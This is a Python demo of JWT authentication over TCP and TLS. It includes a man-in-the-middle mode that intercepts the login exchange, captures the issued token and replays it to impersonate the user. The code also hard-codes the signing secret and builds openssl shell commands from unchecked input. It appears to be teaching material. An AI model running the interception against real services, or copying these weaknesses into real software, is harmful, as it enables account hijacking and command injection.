import jwt
import socket
import threading
import time
import datetime
import ssl
import os
import argparse
import ipaddress
import netifaces

# Shared secret key (only server should have this in real scenario)
JWT_SECRET = "supersecretkey123"

# For certificate-based authentication
CERT_DIR = "../certs"
SERVER_CERT = f"{CERT_DIR}/server.crt"
SERVER_KEY = f"{CERT_DIR}/server.key"
CLIENT_CERT = f"{CERT_DIR}/client.crt"
CLIENT_KEY = f"{CERT_DIR}/client.key"
CA_CERT = f"{CERT_DIR}/ca.crt"


# Generate JWT
def generate_jwt(username, role="user"):
    expiration = datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    payload = {
        "sub": username,
        "role": role,
        "exp": expiration
    }
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    return token


# Verify JWT
def verify_jwt(token):
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        return True, payload
    except jwt.ExpiredSignatureError:
        return False, "Token expired"
    except jwt.InvalidTokenError:
        return False, "Invalid token"


# Get available network interfaces
def get_network_interfaces():
    interfaces = {}
    for interface in netifaces.interfaces():
        # Skip loopback interfaces
        if interface.startswith('lo'):
            continue

        # Get addresses for this interface
        addresses = netifaces.ifaddresses(interface)
        if netifaces.AF_INET in addresses:
            for address in addresses[netifaces.AF_INET]:
                if 'addr' in address:
                    interfaces[interface] = address['addr']

    return interfaces


# ===================== SERVER =====================
class Server:
    def __init__(self, host="0.0.0.0", port=5000, use_ssl=False, server_name="localhost"):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.server_name = server_name  # Used for SSL certificate validation
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))

        if use_ssl:
            # Create SSL context for the server
            self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.context.verify_mode = ssl.CERT_REQUIRED
            self.context.load_cert_chain(certfile=SERVER_CERT, keyfile=SERVER_KEY)
            self.context.load_verify_locations(cafile=CA_CERT)

        # Get actual IP for display
        interfaces = get_network_interfaces()
        print("Available network interfaces:")
        for interface, ip in interfaces.items():
            print(f"  {interface}: {ip}")

        print(f"Server started on {self.host}:{self.port} {'with SSL' if use_ssl else 'without SSL'}")
        print(f"Server hostname for certificates: {self.server_name}")

    def start(self):
        self.socket.listen(5)
        print("Server is listening for connections...")
        while True:
            client, address = self.socket.accept()
            if self.use_ssl:
                try:
                    client = self.context.wrap_socket(client, server_side=True)
                    if client.getpeercert():
                        print(f"Client certificate: {client.getpeercert()}")
                except ssl.SSLError as e:
                    print(f"SSL Error: {e}")
                    client.close()
                    continue

            print(f"Connection from {address}")
            client_thread = threading.Thread(target=self.handle_client, args=(client,))
            client_thread.daemon = True
            client_thread.start()

    def handle_client(self, client_socket):
        try:
            # Receive login info
            data = client_socket.recv(1024).decode()
            print(f"Server received: {data}")

            if data.startswith("AUTH:"):
                # New authentication request
                username = data.split(":")[1]
                token = generate_jwt(username)
                response = f"TOKEN:{token}"
                client_socket.send(response.encode())
                print(f"Sent token to {username}")

            elif data.startswith("ACCESS:"):
                # Resource access with token
                token = data.split(":")[1]
                is_valid, payload = verify_jwt(token)

                if is_valid:
                    username = payload["sub"]
                    print(f"Valid access from {username}")
                    response = f"SUCCESS: Welcome {username}! Access granted to protected resource."
                else:
                    print(f"Invalid token: {payload}")
                    response = f"FAILURE: {payload}"

                client_socket.send(response.encode())
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client_socket.close()


# ===================== CLIENT =====================
class Client:
    def __init__(self, server_host, server_port=5000, username="alice", use_ssl=False, server_name=None):
        self.server_host = server_host
        self.server_port = server_port
        self.username = username
        self.use_ssl = use_ssl
        self.server_name = server_name or server_host  # Use explicit server_name for SSL validation if provided
        self.token = None

        if use_ssl:
            # Create SSL context for the client
            self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            self.context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
            self.context.load_verify_locations(cafile=CA_CERT)
            self.context.check_hostname = True
            self.context.verify_mode = ssl.CERT_REQUIRED

    def connect(self):
        try:
            # Create socket and connect to server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"Connecting to {self.server_host}:{self.server_port}...")

            if self.use_ssl:
                sock = self.context.wrap_socket(sock, server_hostname=self.server_name)

            sock.connect((self.server_host, self.server_port))
            print("Connected successfully!")
            return sock
        except Exception as e:
            print(f"Connection error: {e}")
            return None

    def authenticate(self):
        sock = self.connect()
        if not sock:
            return False

        try:
            # Send authentication request
            auth_message = f"AUTH:{self.username}"
            sock.send(auth_message.encode())
            print(f"Sent authentication request for {self.username}")

            # Receive token
            response = sock.recv(1024).decode()
            if response.startswith("TOKEN:"):
                self.token = response.split(":")[1]
                print(f"Received token: {self.token}")
                return True
            else:
                print(f"Authentication failed: {response}")
                return False
        except Exception as e:
            print(f"Authentication error: {e}")
            return False
        finally:
            sock.close()

    def access_resource(self):
        if not self.token:
            print("No token available. Please authenticate first.")
            return

        sock = self.connect()
        if not sock:
            return

        try:
            # Send access request with token
            access_message = f"ACCESS:{self.token}"
            sock.send(access_message.encode())
            print("Sent resource access request with token")

            # Receive response
            response = sock.recv(1024).decode()
            print(f"Server response: {response}")
        except Exception as e:
            print(f"Resource access error: {e}")
        finally:
            sock.close()


# ===================== MITM SERVER =====================
class MITM:
    def __init__(self, listen_host="0.0.0.0", listen_port=5001,
                 server_host=None, server_port=5000, use_ssl=False, server_name=None):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.server_host = server_host
        self.server_port = server_port
        self.use_ssl = use_ssl
        self.server_name = server_name or server_host  # For SSL validation
        self.captured_token = None

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.listen_host, self.listen_port))

        if use_ssl:
            # Create SSL context for MITM (pretending to be the server when talking to client)
            self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.context.load_cert_chain(certfile=SERVER_CERT, keyfile=SERVER_KEY)
            # Note: In real MITM, attacker would use their own fake certificates

            # Create client context for connecting to the real server
            self.client_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            self.client_context.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
            self.client_context.load_verify_locations(cafile=CA_CERT)

        # Get actual IP for display
        interfaces = get_network_interfaces()
        print("Available network interfaces:")
        for interface, ip in interfaces.items():
            print(f"  {interface}: {ip}")

        print(f"MITM started on {self.listen_host}:{self.listen_port}")
        print(f"MITM forwarding to {server_host}:{server_port}")

    def start(self):
        self.socket.listen(5)
        print("MITM is listening for connections...")
        while True:
            client, address = self.socket.accept()
            if self.use_ssl:
                try:
                    client = self.context.wrap_socket(client, server_side=True)
                except ssl.SSLError as e:
                    print(f"SSL Error with client: {e}")
                    client.close()
                    continue

            print(f"MITM: Intercepted connection from {address}")
            mitm_thread = threading.Thread(target=self.handle_mitm, args=(client,))
            mitm_thread.daemon = True
            mitm_thread.start()

    def handle_mitm(self, client_socket):
        try:
            # Create connection to the real server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"MITM connecting to real server at {self.server_host}:{self.server_port}...")

            if self.use_ssl:
                try:
                    server_socket = self.client_context.wrap_socket(server_socket, server_hostname=self.server_name)
                except ssl.SSLError as e:
                    print(f"SSL Error connecting to server: {e}")
                    client_socket.close()
                    return

            server_socket.connect((self.server_host, self.server_port))
            print("MITM connected to real server")

            # Receive from client
            data = client_socket.recv(1024).decode()
            print(f"MITM intercepted from client: {data}")

            # Forward to server
            server_socket.send(data.encode())

            # Receive from server
            response = server_socket.recv(1024).decode()
            print(f"MITM intercepted from server: {response}")

            # Capture token if present
            if response.startswith("TOKEN:"):
                self.captured_token = response.split(":")[1]
                print(f"MITM captured token: {self.captured_token}")

            # Forward back to client
            client_socket.send(response.encode())
        except Exception as e:
            print(f"MITM error: {e}")
        finally:
            client_socket.close()
            server_socket.close()

    def use_captured_token(self):
        if not self.captured_token:
            print("No token captured yet. Cannot impersonate client.")
            return

        try:
            # Connect to the real server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"MITM impersonation: Connecting to server at {self.server_host}:{self.server_port}...")

            if self.use_ssl:
                try:
                    sock = self.client_context.wrap_socket(sock, server_hostname=self.server_name)
                except ssl.SSLError as e:
                    print(f"SSL Error connecting to server: {e}")
                    return

            sock.connect((self.server_host, self.server_port))
            print("Connected to server for impersonation")

            # Use captured token to access protected resource
            access_message = f"ACCESS:{self.captured_token}"
            sock.send(access_message.encode())
            print("MITM: Sent resource access request with captured token")

            # Receive response
            response = sock.recv(1024).decode()
            print(f"MITM impersonation result: {response}")
        except Exception as e:
            print(f"MITM impersonation error: {e}")
        finally:
            sock.close()


# Certificate generation utilities
def setup_certificates(server_hostname):
    """Create directories and generate all necessary certificates for the demo"""
    if not os.path.exists(CERT_DIR):
        os.makedirs(CERT_DIR)

    print(f"Creating certificates for server hostname: {server_hostname}")

    # Create CA certificate
    os.system(
        f'openssl req -x509 -new -nodes -newkey rsa:2048 -keyout {CERT_DIR}/ca.key -out {CA_CERT} -subj "/CN=Demo CA" -days 365')

    # Create server certificate and sign it
    os.system(
        f'openssl req -new -newkey rsa:2048 -nodes -keyout {SERVER_KEY} -out {CERT_DIR}/server.csr -subj "/CN={server_hostname}"')
    os.system(
        f'openssl x509 -req -in {CERT_DIR}/server.csr -CA {CA_CERT} -CAkey {CERT_DIR}/ca.key -CAcreateserial -out {SERVER_CERT} -days 365')

    # Create client certificate and sign it
    os.system(
        f'openssl req -new -newkey rsa:2048 -nodes -keyout {CLIENT_KEY} -out {CERT_DIR}/client.csr -subj "/CN=ClientCert"')
    os.system(
        f'openssl x509 -req -in {CERT_DIR}/client.csr -CA {CA_CERT} -CAkey {CERT_DIR}/ca.key -CAcreateserial -out {CLIENT_CERT} -days 365')

    print("Certificates created successfully")
    print(f"\nIMPORTANT: You need to distribute these certificates to all machines:")
    print(f"- Copy the entire '{CERT_DIR}' directory to all three machines")
    print(f"- Ensure the server hostname '{server_hostname}' matches the actual server DNS name or IP")
    print(f"- If using IPs instead of DNS names, certificate validation might fail unless you add -subjectAltName options")

# Server script
def run_server(args):
    """Run the server component"""
    use_ssl = args.ssl
    if use_ssl:
        setup_certificates(args.server_name)

    server = Server(host=args.host, port=args.port, use_ssl=use_ssl, server_name=args.server_name)
    server.start()

# Client script
def run_client(args):
    """Run the client component"""
    client = Client(
        server_host=args.server_host,
        server_port=args.server_port,
        username=args.username,
        use_ssl=args.ssl,
        server_name=args.server_name
    )

    if args.authenticate:
        success = client.authenticate()
        if success and args.access:
            time.sleep(1)  # Small delay
            client.access_resource()
    elif args.access and client.token:
        client.access_resource()

# MITM script
def run_mitm(args):
    """Run the MITM component"""
    mitm = MITM(
        listen_host=args.host,
        listen_port=args.port,
        server_host=args.server_host,
        server_port=args.server_port,
        use_ssl=args.ssl,
        server_name=args.server_name
    )

    mitm_thread = threading.Thread(target=mitm.start)
    mitm_thread.daemon = True
    mitm_thread.start()

    try:
        while True:
            cmd = input("\nEnter 'use' to use captured token, 'q' to quit: ")
            if cmd.lower() == 'use':
                mitm.use_captured_token()
            elif cmd.lower() == 'q':
                break
    except KeyboardInterrupt:
        print("MITM terminated.")

def main():
    parser = argparse.ArgumentParser(description="JWT Authentication System with MITM Demo")
    subparsers = parser.add_subparsers(dest="mode", help="Mode to run the program in")
    subparsers.required = True

    # Server parser
    server_parser = subparsers.add_parser("server", help="Run in server mode")
    server_parser.add_argument("--host", default="0.0.0.0", help="Host to bind to")
    server_parser.add_argument("--port", type=int, default=5000, help="Port to listen on")
    server_parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    server_parser.add_argument("--server-name", default="localhost", help="Server hostname for SSL certificate")

    # Client parser
    client_parser = subparsers.add_parser("client", help="Run in client mode")
    client_parser.add_argument("--server-host", required=True, help="Server hostname/IP to connect to")
    client_parser.add_argument("--server-port", type=int, default=5000, help="Server port to connect to")
    client_parser.add_argument("--username", default="alice", help="Username to authenticate with")
    client_parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    client_parser.add_argument("--server-name", help="Server hostname for SSL certificate validation")
    client_parser.add_argument("--authenticate", action="store_true", help="Authenticate with the server")
    client_parser.add_argument("--access", action="store_true", help="Access protected resource")

    # MITM parser
    mitm_parser = subparsers.add_parser("mitm", help="Run in MITM mode")
    mitm_parser.add_argument("--host", default="0.0.0.0", help="Host to bind to")
    mitm_parser.add_argument("--port", type=int, default=5001, help="Port to listen on")
    mitm_parser.add_argument("--server-host", required=True, help="Real server hostname/IP")
    mitm_parser.add_argument("--server-port", type=int, default=5000, help="Real server port")
    mitm_parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    mitm_parser.add_argument("--server-name", help="Server hostname for SSL certificate validation")

    args = parser.parse_args()

    if args.mode == "server":
        run_server(args)
    elif args.mode == "client":
        run_client(args)
    elif args.mode == "mitm":
        run_mitm(args)

if __name__ == "__main__":
    main()